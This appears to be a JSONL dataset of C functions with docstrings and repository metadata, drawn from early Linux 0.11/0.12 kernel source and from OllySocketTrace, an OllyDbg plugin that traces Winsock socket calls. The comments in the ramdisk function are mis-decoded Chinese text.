{"docstring": "/*\n *\tnamei()\n *\n * is used by most simple commands to get the inode of a specified name.\n * Open, link etc use their own routines, but this is enough for things\n * like 'chmod' etc.\n */\n", "func_signal": "struct m_inode * namei(const char * pathname)", "code": "{\n\tconst char * basename;\n\tint inr,dev,namelen;\n\tstruct m_inode * dir;\n\tstruct buffer_head * bh;\n\tstruct dir_entry * de;\n\n\tif (!(dir = dir_namei(pathname,&namelen,&basename)))\n\t\treturn NULL;\n\tif (!namelen)\t\t\t/* special case: '/usr/' etc */\n\t\treturn dir;\n\tbh = find_entry(&dir,basename,namelen,&de);\n\tif (!bh) {\n\t\tiput(dir);\n\t\treturn NULL;\n\t}\n\tinr = de->inode;\n\tdev = dir->i_dev;\n\tbrelse(bh);\n\tiput(dir);\n\tdir=iget(dev,inr);\n\tif (dir) {\n\t\tdir->i_atime=CURRENT_TIME;\n\t\tdir->i_dirt=1;\n\t}\n\treturn dir;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * Supplementary group ID's\n */\n", "func_signal": "int sys_getgroups(int gidsetsize, gid_t *grouplist)", "code": "{\n\tint\ti;\n\n\tif (gidsetsize)\n\t\tverify_area(grouplist, sizeof(gid_t) * gidsetsize);\n\n\tfor (i = 0; (i < NGROUPS) && (current->groups[i] != NOGROUP);\n\t     i++, grouplist++) {\n\t\tif (gidsetsize) {\n\t\t\tif (i >= gidsetsize)\n\t\t\t\treturn -EINVAL;\n\t\t\tput_fs_word(current->groups[i], (short *) grouplist);\n\t\t}\n\t}\n\treturn(i);\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * setgid() is implemeneted like SysV w/ SAVED_IDS \n */\n", "func_signal": "int sys_setgid(int gid)", "code": "{\n\tif (suser())\n\t\tcurrent->gid = current->egid = current->sgid = gid;\n\telse if ((gid == current->gid) || (gid == current->sgid))\n\t\tcurrent->egid = gid;\n\telse\n\t\treturn -EPERM;\n\treturn 0;\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * This is done BSD-style, with no consideration of the saved gid, except\n * that if you set the effective gid, it sets the saved gid too.  This \n * makes it possible for a setgid program to completely drop its privileges,\n * which is often a useful assertion to make when you are doing a security\n * audit over a program.\n *\n * The general idea is that a program which uses just setregid() will be\n * 100% compatible with BSD.  A program which uses just setgid() will be\n * 100% compatible with POSIX w/ Saved ID's. \n */\n", "func_signal": "int sys_setregid(int rgid, int egid)", "code": "{\n\tif (rgid>0) {\n\t\tif ((current->gid == rgid) || \n\t\t    suser())\n\t\t\tcurrent->gid = rgid;\n\t\telse\n\t\t\treturn(-EPERM);\n\t}\n\tif (egid>0) {\n\t\tif ((current->gid == egid) ||\n\t\t    (current->egid == egid) ||\n\t\t    suser()) {\n\t\t\tcurrent->egid = egid;\n\t\t\tcurrent->sgid = egid;\n\t\t} else\n\t\t\treturn(-EPERM);\n\t}\n\treturn 0;\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * routine to check that the specified directory is empty (for rmdir)\n */\n", "func_signal": "static int empty_dir(struct m_inode * inode)", "code": "{\n\tint nr,block;\n\tint len;\n\tstruct buffer_head * bh;\n\tstruct dir_entry * de;\n\n\tlen = inode->i_size / sizeof (struct dir_entry);\n\tif (len<2 || !inode->i_zone[0] ||\n\t    !(bh=bread(inode->i_dev,inode->i_zone[0]))) {\n\t    \tprintk(\"warning - bad directory on dev %04x\\n\",inode->i_dev);\n\t\treturn 0;\n\t}\n\tde = (struct dir_entry *) bh->b_data;\n\tif (de[0].inode != inode->i_num || !de[1].inode || \n\t    strcmp(\".\",de[0].name) || strcmp(\"..\",de[1].name)) {\n\t    \tprintk(\"warning - bad directory on dev %04x\\n\",inode->i_dev);\n\t\treturn 0;\n\t}\n\tnr = 2;\n\tde += 2;\n\twhile (nr<len) {\n\t\tif ((void *) de >= (void *) (bh->b_data+BLOCK_SIZE)) {\n\t\t\tbrelse(bh);\n\t\t\tblock=bmap(inode,nr/DIR_ENTRIES_PER_BLOCK);\n\t\t\tif (!block) {\n\t\t\t\tnr += DIR_ENTRIES_PER_BLOCK;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (!(bh=bread(inode->i_dev,block)))\n\t\t\t\treturn 0;\n\t\t\tde = (struct dir_entry *) bh->b_data;\n\t\t}\n\t\tif (de->inode) {\n\t\t\tbrelse(bh);\n\t\t\treturn 0;\n\t\t}\n\t\tde++;\n\t\tnr++;\n\t}\n\tbrelse(bh);\n\treturn 1;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n *\tfind_entry()\n *\n * finds an entry in the specified directory with the wanted name. It\n * returns the cache buffer in which the entry was found, and the entry\n * itself (as a parameter - res_dir). It does NOT read the inode of the\n * entry - you'll have to do that yourself if you want to.\n *\n * This also takes care of the few special cases due to '..'-traversal\n * over a pseudo-root and a mount point.\n */\n", "func_signal": "static struct buffer_head * find_entry(struct m_inode ** dir,\n\tconst char * name, int namelen, struct dir_entry ** res_dir)", "code": "{\n\tint entries;\n\tint block,i;\n\tstruct buffer_head * bh;\n\tstruct dir_entry * de;\n\tstruct super_block * sb;\n\n#ifdef NO_TRUNCATE\n\tif (namelen > NAME_LEN)\n\t\treturn NULL;\n#else\n\tif (namelen > NAME_LEN)\n\t\tnamelen = NAME_LEN;\n#endif\n\tentries = (*dir)->i_size / (sizeof (struct dir_entry));\n\t*res_dir = NULL;\n\tif (!namelen)\n\t\treturn NULL;\n/* check for '..', as we might have to do some \"magic\" for it */\n\tif (namelen==2 && get_fs_byte(name)=='.' && get_fs_byte(name+1)=='.') {\n/* '..' in a pseudo-root results in a faked '.' (just change namelen) */\n\t\tif ((*dir) == current->root)\n\t\t\tnamelen=1;\n\t\telse if ((*dir)->i_num == ROOT_INO) {\n/* '..' over a mount-point results in 'dir' being exchanged for the mounted\n   directory-inode. NOTE! We set mounted, so that we can iput the new dir */\n\t\t\tsb=get_super((*dir)->i_dev);\n\t\t\tif (sb->s_imount) {\n\t\t\t\tiput(*dir);\n\t\t\t\t(*dir)=sb->s_imount;\n\t\t\t\t(*dir)->i_count++;\n\t\t\t}\n\t\t}\n\t}\n\tif (!(block = (*dir)->i_zone[0]))\n\t\treturn NULL;\n\tif (!(bh = bread((*dir)->i_dev,block)))\n\t\treturn NULL;\n\ti = 0;\n\tde = (struct dir_entry *) bh->b_data;\n\twhile (i < entries) {\n\t\tif ((char *)de >= BLOCK_SIZE+bh->b_data) {\n\t\t\tbrelse(bh);\n\t\t\tbh = NULL;\n\t\t\tif (!(block = bmap(*dir,i/DIR_ENTRIES_PER_BLOCK)) ||\n\t\t\t    !(bh = bread((*dir)->i_dev,block))) {\n\t\t\t\ti += DIR_ENTRIES_PER_BLOCK;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tde = (struct dir_entry *) bh->b_data;\n\t\t}\n\t\tif (match(namelen,name,de)) {\n\t\t\t*res_dir = de;\n\t\t\treturn bh;\n\t\t}\n\t\tde++;\n\t\ti++;\n\t}\n\tbrelse(bh);\n\treturn NULL;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "// \u05b4(ramdisk)\u0434\u1e79do_hd_request()(kernel/blk_drv/hd.c,294)\n", "func_signal": "void\ndo_rd_request (void)", "code": "{\n  int len;\n  char *addr;\n\n  INIT_REQUEST;\t\t\t// \u013a\u03f7(\u03bckernel/blk_drv/blk.h,127)\n// \u0221ramdisk \u02bc\u04e6\u06b4\u02bc\u03bb\u00fa\u06b4\u6ce4\u0221\n// sector << 9 \u02besector * 512CURRENT \u03aa(blk_dev[MAJOR_NR].current_request)\n  addr = rd_start + (CURRENT->sector << 9);\n  len = CURRENT->nr_sectors << 9;\n// \u8c78\u0172\u03aa1 \u07f6\u04e6\u06b4\u02bc\u03bb>\u0129\u03b2\udb4e\udf32\u05earepeat \n// 28 \u0435INIT_REQUEST \u06bf\u02bc\n  if ((MINOR (CURRENT->dev) != 1) || (addr + len > rd_start + rd_length))\n    {\n      end_request (0);\n      goto repeat;\n    }\n// \u0434(WRITE)\u043b\u0778\u01b5addr \u03aalen \u05bd\u06a1\n  if (CURRENT->cmd == WRITE)\n    {\n      (void) memcpy (addr, CURRENT->buffer, len);\n// \u01f6(READ)addr \u02bc\u0778\u01b5\u043b\u0423\u03aalen \u05bd\u06a1\n    }\n  else if (CURRENT->cmd == READ)\n    {\n      (void) memcpy (CURRENT->buffer, addr, len);\n// \u02be\uecbb\u06a3\n    }\n  else\n    panic (\"unknown ramdisk-command\");\n// \u0279\u00f8\u00b1\u05be\u8c78\u04bb\ue863\n  end_request (1);\n  goto repeat;\n}", "path": "data\\Linux0.11\u5185\u6838\u6e90\u4ee3\u7801\\kernel\\blk_drv\\ramdisk.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * Only sethostname; gethostname can be implemented by calling uname()\n */\n", "func_signal": "int sys_sethostname(char *name, int len)", "code": "{\n\tint\ti;\n\t\n\tif (!suser())\n\t\treturn -EPERM;\n\tif (len > MAXHOSTNAMELEN)\n\t\treturn -EINVAL;\n\tfor (i=0; i < len; i++) {\n\t\tif ((thisname.nodename[i] = get_fs_byte(name+i)) == 0)\n\t\t\tbreak;\n\t}\n\tif (thisname.nodename[i]) {\n\t\tthisname.nodename[i>MAXHOSTNAMELEN ? MAXHOSTNAMELEN : i] = 0;\n\t}\n\treturn 0;\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "char * TraceDialog_FormatTrace( LPLOGDATA pLogData, int iCount, DWORD dwSocket )", "code": "{\n    int i, iPacketCount = 0;\n    char * cpText       = (char *)MyMalloc( 4 );\n\n    memset( cpText, 0, 4 );\n\n    __try\n    {\n        for( i=0 ; i<iCount ; i++ )\n        {\n            if( pLogData[i].dwSocket == dwSocket && pLogData[i].lpOllyBuffer != NULL && pLogData[i].dwOllyBufferSize > 0 )\n            {\n                DWORD dwBuffSize  = (pLogData[i].dwOllyBufferSize * 4) + 4096;\n                char * cpBuffer   = (char *)MyMalloc( dwBuffSize ); // calc this properly\n                if( cpBuffer != NULL )\n                {\n                    iPacketCount++;\n                    PrintHex( cpBuffer, dwBuffSize, pLogData[i].lpOllyBuffer, pLogData[i].dwOllyBufferSize );\n\n                    dwBuffSize = strlen(cpText) + strlen(cpBuffer) + 128;\n                    cpText = (char *)MyReAlloc( cpText, dwBuffSize );      // <-- we did fuck up in here :( why????\n                    if( cpText != NULL )\n                    {\n                        char cHeader[128];\n                        snprintf( cHeader, 128, \"\\r\\n----[ %s == %s\\r\\n\", pLogData[i].cMessage, pLogData[i].cReturnMessage );\n                        strncat( cpText, cHeader, dwBuffSize );\n                        strncat( cpText, cpBuffer, dwBuffSize );\n                    }\n                    MyFree( cpBuffer );\n                }\n                continue;\n            }\n        }\n\n        if( cpText != NULL && iPacketCount == 0 )\n        {\n            MyFree( cpText );\n            cpText = NULL;\n        }\n    }\n    __except( EXCEPTION_EXECUTE_HANDLER )\n    {\n        MyFree( cpText );\n        cpText = NULL;\n    }\n\n    return cpText;\n}", "path": "src\\TraceDialog.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSASendTo_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    // int WSASendTo( SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent,\n    //                DWORD dwFlags, const struct sockaddr* lpTo, int iToLen, LPWSAOVERLAPPED lpOverlapped,\n    //                LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine );\n    DWORD dwParameters[9];\n    char cFlagsOutput[MAX_PATH];\n    WSABUF wsaBuffer;\n\n    if( Readmemory( &dwParameters, pRegisters->r[REG_ESP]+4, sizeof(DWORD)*9, MM_SILENT ) == 0 )\n        return FALSE;\n\n    pLogData->dwSocket = dwParameters[0];\n\n    pLogData->dwValueA = dwParameters[3];\n\n    record_sockaddr( pLogData, \"Sending to\", dwParameters[5], dwParameters[6] );\n\n    if( dwParameters[2] > 0 )\n    {\n        // TO-DO: support multiple buffers...\n        if( Readmemory( &wsaBuffer, dwParameters[1], sizeof(WSABUF), MM_SILENT ) != 0 )\n        {\n            pLogData->dwDbgBuffer     = (DWORD)wsaBuffer.buf;\n\t        pLogData->dwDbgBufferSize = wsaBuffer.len;\n\n            record_buffer( pLogData, SIZE_THRESHOLD );\n        }\n    }\n\n    ResolveFlags( (struct FLAGS *)&msg_flags, TRUE, dwParameters[4], (char *)&cFlagsOutput );\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSASendTo( %d, 0x%08X, %d, 0x%08X, %s, 0x%08X, %d, 0x%08X, 0x%08X )\", dwParameters[0], dwParameters[1], dwParameters[2], dwParameters[3], cFlagsOutput, dwParameters[5], dwParameters[6], dwParameters[7], dwParameters[8] );\n\n    return TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSASocket_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    //SOCKET WSASocket( int af, int type, int protocol, LPWSAPROTOCOL_INFO lpProtocolInfo, GROUP g, DWORD dwFlags );\n\tDWORD dwParameters[6];\n\tchar cFlagsOutput[MAX_PATH];\n    char cFlagsOutput_AF[MAX_PATH];\n\tchar cFlagsOutput_TYPE[MAX_PATH];\n\tchar cFlagsOutput_PROTOCOL[MAX_PATH];\n\n\tif( Readmemory( &dwParameters, pRegisters->r[REG_ESP]+4, sizeof(DWORD)*6, MM_SILENT ) == 0 )\n        return FALSE;\n\n\tResolveFlags( (struct FLAGS *)&af_flags, FALSE, dwParameters[0], (char *)&cFlagsOutput_AF );\n\tResolveFlags( (struct FLAGS *)&type_flags, FALSE, dwParameters[1], (char *)&cFlagsOutput_TYPE );\n\tResolveFlags( (struct FLAGS *)&protocol_flags, FALSE, dwParameters[2], (char *)&cFlagsOutput_PROTOCOL );\n    ResolveFlags( (struct FLAGS *)&wsasocket_flags, FALSE, dwParameters[5], (char *)&cFlagsOutput );\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSASocket( %s, %s, %s, 0x%08X, %d, %s )\", cFlagsOutput_AF, cFlagsOutput_TYPE, cFlagsOutput_PROTOCOL, dwParameters[3], dwParameters[4], cFlagsOutput );\n\n\treturn TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "int LogWindowGetText( char * cpBuffer, char * pMask, int * pSelect, t_sortheader * pHeader, int iColumn )", "code": "{\n\tint i = 0;\n\tLPLOGDATA pLogData = (LPLOGDATA)pHeader;\n\tBYTE bColor = GetColor( pLogData->dwSocket );\n\n\tif( iColumn == 0 )\n\t{\n\t\t*pSelect = DRAW_GRAY;\n\t\ti = Decodeaddress( pLogData->dwCallerAddress, 0, ADC_VALID, cpBuffer, BUFFER_SIZE, NULL );\n\t\tif( i == 0 )\n\t\t\ti = snprintf( cpBuffer, BUFFER_SIZE, \"0x%.8X\", pLogData->dwCallerAddress );\n\t}\n\telse if( iColumn == 1 )\n\t{\n\t\t*pSelect = DRAW_GRAY;\n\t\ti = snprintf( cpBuffer, BUFFER_SIZE, \"0x%.8X\", pLogData->dwThreadId );\n\t}\n\telse if( iColumn == 2 )\n\t{\n\t\ti = snprintf( cpBuffer, BUFFER_SIZE, \"%s\", pLogData->cMessage );\n\t\t*pSelect = DRAW_MASK;\n\t\tmemset( pMask, DRAW_DIRECT|bColor, i );\n\t}\n\telse if( iColumn == 3 )\n\t{\n\t\tif( strlen( pLogData->cReturnMessage ) > 0 )\n\t\t{\n\t\t\ti = snprintf( cpBuffer, BUFFER_SIZE, \"%s\", pLogData->cReturnMessage );\n\t\t\t*pSelect = DRAW_MASK;\n\t\t\tmemset( pMask, DRAW_DIRECT|bColor, i );\n\t\t}\n\t}\n\telse if( iColumn == 4 )\n\t{\n\t\t*pSelect = DRAW_GRAY;\n        i = snprintf( cpBuffer, BUFFER_SIZE, \"%s\", pLogData->cHint );\n\t}\n\treturn i;\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "void _export cdecl ODBG_Plugindestroy( void )", "code": "{\n\tint i;\n\tLPLOGDATA pLogData;\n\tbEnabled = FALSE;\n\n\tUnregisterpluginclass( cLogWindowClass );\n\n\tpLogData = (LPLOGDATA)logtable.data.data;\n\tfor( i=0 ; i<logtable.data.n ; i++ )\n    {\n        if( pLogData[i].lpOllyBuffer != NULL )\n            MyFree( pLogData[i].lpOllyBuffer );\n\t\tMyFree( &pLogData[i] );\n    }\n\n\tDestroysorteddata( &(logtable.data) );\n    // we dont need to create a new sorteddata when were are destroying the plugin\n    \n\tBreakpoints_Disable( FALSE );\n\n    HeapDestroy( hMyHeap );\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "void PrintHex( char * cpOutput, DWORD dwOutputSize, BYTE * pBuffer, int size )", "code": "{\n\tint x, y;\n\tchar cBuff[1024];\n\tmemset( cBuff, 0, 1024 );\n\tmemset( cpOutput, 0, dwOutputSize );\n\tdwOutputSize -= 4;\n\n\tfor( x=1; x<=size; x++ )\n\t{\n\t\tif( x == 1 )\n\t\t{\n\t\t\tsnprintf( cBuff, 1024, \"%04X  \", x-1 ); // Print an offset line header\n\t\t\tstrncat( cpOutput, cBuff, dwOutputSize );\n\t\t}\n\n\t\tsnprintf( cBuff, 1024, \"%02X \", pBuffer[x-1] ); // print the hex value\n\t\tstrncat( cpOutput, cBuff, dwOutputSize );\n\n\t\t//if( x % 8 == 0 )\n\t\t//\tstrncat( cpOutput, \" \", dwOutputSize ); // padding space at 8 and 16 bytes\n\n\t\tif( x % 16 == 0 )\n\t\t{\n\t\t\t// We're at the end of a line of hex, print the printables\n\t\t\tstrncat( cpOutput, \" \", dwOutputSize );\n\n\t\t\tfor( y = x - 15; y <= x; y++ )\n\t\t\t{\n\t\t\t\tif( isprint( pBuffer[y-1] ) )\n\t\t\t\t{\n\t\t\t\t\tsnprintf( cBuff, 1024, \"%c\", pBuffer[y-1] ); // if it's printable, print it\n\t\t\t\t\tstrncat( cpOutput, cBuff, dwOutputSize );\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tstrncat( cpOutput, \".\", dwOutputSize ); // otherwise substitute a period\n\n\t\t\t\t//if( y % 8 == 0 )\n\t\t\t\t//\tstrncat( cpOutput, \" \", dwOutputSize ); // 8 byte padding space\n\t\t\t}\n\n\t\t\tif( x < size )\n\t\t\t{\n\t\t\t\tsnprintf( cBuff, 1024, \"\\r\\n%04X  \", x ); // Print an offset line header\n\t\t\t\tstrncat( cpOutput, cBuff, dwOutputSize );\n\t\t\t}\n\t\t}\n\t}\n\tx--;\n\n\t// If we didn't end on a 16 byte boundary, print some placeholder spaces before printing ascii\n\tif( x % 16 != 0 )\n\t{\n\t\tfor( y = x+1; y <= x + (16-(x % 16)); y++ )\n\t\t{\n\t\t\tstrncat( cpOutput, \"   \", dwOutputSize ); // hex value placeholder spaces\n\t\t\t//if( y % 8 == 0 )\n\t\t\t//\tstrncat( cpOutput, \" \", dwOutputSize ); // 8 and 16 byte padding spaces\n\t\t}\n\n\t\t// print the printables\n\t\tstrncat( cpOutput, \" \", dwOutputSize );\n\t\tfor( y = (x+1) - (x % 16); y <= x; y++ )\n\t\t{\n\t\t\tif( isprint( pBuffer[y-1] ) )\n\t\t\t{\n\t\t\t\tsnprintf( cBuff, 1024, \"%c\", pBuffer[y-1] ); // if it's printable, print it\n\t\t\t\tstrncat( cpOutput, cBuff, dwOutputSize );\n\t\t\t}\n\t\t\telse\n\t\t\t\tstrncat( cpOutput, \".\", dwOutputSize ); // otherwise substitute a period\n\n\t\t\t//if( y % 8 == 0 )\n\t\t\t//\tstrncat( cpOutput, \" \", dwOutputSize ); // 8 and 16 byte padding space\n\t\t}\n\t}\n\n\tstrncat( cpOutput, \"\\r\\n\", dwOutputSize );\n}", "path": "src\\TraceDialog.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSARecvFrom_Return( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    record_sockaddr( pLogData, \"Recieved from\", pLogData->dwValueB, pLogData->dwValueC );\n    return WSARecv_Return( pLogData, pRegisters );\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSASend_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    // int WSASend( SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent,\n    //              DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine );\n    DWORD dwParameters[7];\n    WSABUF wsaBuffer;\n   \tchar cFlagsOutput[MAX_PATH];\n\n    if( Readmemory( &dwParameters, pRegisters->r[REG_ESP]+4, sizeof(DWORD)*7, MM_SILENT ) == 0 )\n        return FALSE;\n    pLogData->dwSocket = dwParameters[0];\n\n    ResolveFlags( (struct FLAGS *)&msg_flags, TRUE, dwParameters[4], (char *)&cFlagsOutput );\n\n    pLogData->dwValueA = dwParameters[3];\n\n    if( dwParameters[2] > 0 )\n    {\n        // TO-DO: support multiple buffers...\n        if( Readmemory( &wsaBuffer, dwParameters[1], sizeof(WSABUF), MM_SILENT ) != 0 )\n        {\n            pLogData->dwDbgBuffer     = (DWORD)wsaBuffer.buf;\n\t        pLogData->dwDbgBufferSize = wsaBuffer.len;\n\n            record_buffer( pLogData, SIZE_THRESHOLD );\n        }\n    }\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSASend( %d, 0x%08X, %d, 0x%08X, %s, 0x%08X, 0x%08X )\", dwParameters[0], dwParameters[1], dwParameters[2], dwParameters[3], cFlagsOutput, dwParameters[5], dwParameters[6] );\n\n\treturn TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSARecvFrom_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    // int WSARecvFrom( SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd,\n    //                  LPDWORD lpFlags, struct sockaddr* lpFrom, LPINT lpFromlen, LPWSAOVERLAPPED lpOverlapped,\n    //                  LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine );\n    DWORD dwParameters[9];\n    char cFlagsOutput[MAX_PATH];\n    WSABUF wsaBuffer;\n\n    if( Readmemory( &dwParameters, pRegisters->r[REG_ESP]+4, sizeof(DWORD)*9, MM_SILENT ) == 0 )\n        return FALSE;\n\n    pLogData->dwSocket = dwParameters[0];\n    if( dwParameters[2] > 0 )\n    {\n        // TO-DO: support multiple buffers...\n        if( Readmemory( &wsaBuffer, dwParameters[1], sizeof(WSABUF), MM_SILENT ) != 0 )\n        {\n            pLogData->dwDbgBuffer     = (DWORD)wsaBuffer.buf;\n\t        pLogData->dwDbgBufferSize = wsaBuffer.len;\n        }\n    }\n\n    pLogData->dwValueA = dwParameters[3]; // lpNumberOfBytesRecvd\n\n    if( dwParameters[6] != NULL ) // lpFromlen\n    {\n        if( Readmemory( &pLogData->dwValueC, dwParameters[6], sizeof(DWORD), MM_SILENT ) != 0 )\n            pLogData->dwValueB = dwParameters[5]; // lpFrom\n    }\n\n    ResolveFlags( (struct FLAGS *)&msg_flags, TRUE, dwParameters[4], (char *)&cFlagsOutput );\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSARecvFrom( %d, 0x%08X, %d, 0x%08X, %s, 0x%08X, 0x%08X, 0x%08X, 0x%08X )\", dwParameters[0], dwParameters[1], dwParameters[2], dwParameters[3], cFlagsOutput, dwParameters[5], dwParameters[6], dwParameters[7], dwParameters[8] );\n\n    return TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL MyFree( LPVOID lpAddress )", "code": "{\n    if( lpAddress == NULL )\n        return FALSE;\n    return (BOOL)HeapFree( hMyHeap, 0, lpAddress );\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSAAsyncSelect_Call( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    //int WSAAsyncSelect( SOCKET s, HWND hWnd, unsigned int wMsg, long lEvent );\n    DWORD dwParameters[4];\n\tchar cFlagsOutput[MAX_PATH];\n\n    if( Readmemory( &dwParameters, pRegisters->r[REG_ESP]+4, sizeof(DWORD)*4, MM_SILENT ) == 0 )\n        return FALSE;\n\n    pLogData->dwSocket = dwParameters[0];\n\n    ResolveFlags( (struct FLAGS *)&asyncselect_flags, TRUE, dwParameters[3], (char *)&cFlagsOutput );\n\n\tsnprintf( pLogData->cMessage, BUFFER_SIZE, \"WSAAsyncSelect( %d, 0x%08X, 0x%08X, %s )\", dwParameters[0], dwParameters[1], dwParameters[2], cFlagsOutput );\n\n    return TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "void _export cdecl ODBG_Pluginreset( void )", "code": "{\n\tint i;\n\tLPLOGDATA pLogData;\n\tbEnabled = FALSE;\n\n\tpLogData = (LPLOGDATA)logtable.data.data;\n\tfor( i=0 ; i<logtable.data.n ; i++ )\n    {\n        if( pLogData[i].lpOllyBuffer != NULL )\n            MyFree( pLogData[i].lpOllyBuffer );\n\t\tMyFree( &pLogData[i] );\n    }\n\n\tDestroysorteddata( &(logtable.data) );\n\tCreatesorteddata( &(logtable.data), NULL, sizeof(LOGDATA), 64, NULL, NULL );\n\n\tBreakpoints_Disable( FALSE );\n\n    // we dont destroy our heap when we reset\n}", "path": "src\\main.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "BOOL WSARecv_Return( LPLOGDATA pLogData, t_reg * pRegisters )", "code": "{\n    DWORD dwNumberOfBytesRecvd = NULL;\n    char cBuffer[BUFFER_SIZE];\n    if( pLogData->dwValueA != NULL && pRegisters->r[REG_EAX] != (DWORD)SOCKET_ERROR )\n    {\n        if( Readmemory( &dwNumberOfBytesRecvd, pLogData->dwValueA, sizeof(DWORD), MM_SILENT ) != 0 )\n        {\n            snprintf( cBuffer, BUFFER_SIZE, \"Recieved %d bytes. \", dwNumberOfBytesRecvd );\n            strncat( pLogData->cHint, cBuffer, BUFFER_SIZE );\n\n            if( dwNumberOfBytesRecvd > 0 )\n            {\n                if( dwNumberOfBytesRecvd < SIZE_THRESHOLD )\n                    record_buffer( pLogData, dwNumberOfBytesRecvd );\n                else\n                    record_buffer( pLogData, SIZE_THRESHOLD );\n            }\n        }\n    }\n\n    if( pRegisters->r[REG_EAX] == (DWORD)SOCKET_ERROR )\n    \tsnprintf( pLogData->cReturnMessage, BUFFER_SIZE, \"SOCKET_ERROR\" );\n    else\n        snprintf( pLogData->cReturnMessage, BUFFER_SIZE, \"%d\", pRegisters->r[REG_EAX] );\n\n\treturn TRUE;\n}", "path": "src\\WSA_hooks.c", "repo_name": "stephenfewer/OllySocketTrace", "stars": 60, "license": "None", "language": "c", "size": 265}
